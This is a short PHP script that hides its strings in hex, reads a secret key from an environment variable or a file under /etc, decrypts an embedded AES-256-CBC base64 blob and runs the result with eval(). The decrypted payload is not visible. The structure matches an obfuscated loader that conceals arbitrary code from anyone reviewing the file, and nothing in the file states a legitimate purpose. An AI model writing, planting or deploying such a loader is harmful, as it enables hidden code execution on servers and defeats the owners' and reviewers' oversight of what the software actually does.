<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('svNiJrBnaI2/8y/v8oKk+A==');

$c=base64_decode(

'3rHInMdDmUHKQBTi2xZf2LXUfYh6XKMHVduAhnuDt+TzAAPZN/Gm/VOlufIDtk+nwykBl2cM7pBr' .
'W45kvdXUMr1Ew1EfJmzlifXIiA3mspAy/ctNRXkySAvfE7ftRwUdPD0DC5XeMIeYhtK+rAtWgq/Q' .
'U8lI8gXv5mPY1jimPJDAcx5HDGY33Avs99YUdDNEqdbqwRvsjSTQg4aGl2HWVAm24c42IS55l/H1' .
'bfEKWMFKa5fXnW/C0sej7tiZyGLlQ+rROWsnxV1F4V3bjoBet5LQKBSclAQ8UvKBZcRPDOION8fv' .
'hRhPWHbCUGQFDoiNtSGy7ZBsecwacaV821BjqAzNohr49Q046wxYTw0LLWMOMNIKdZwHpq4R8JrK' .
'PFBioaPiyh8tUOhFNZ8AgkGwXTTI7kcNayH+yQYzJmVsPqTxXz2HtXASQAD/1Xd2rmBHTWTKNjqf' .
'HGLlIlUObwrK4w8tjkNLSSIuQDokMufdjDXC/pUayOw8Rs2XBz1c8uwVtMABfZC/IzW0PhY9ejm2' .
'eFJKBuY9EOq+r/WRuEft0j8='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

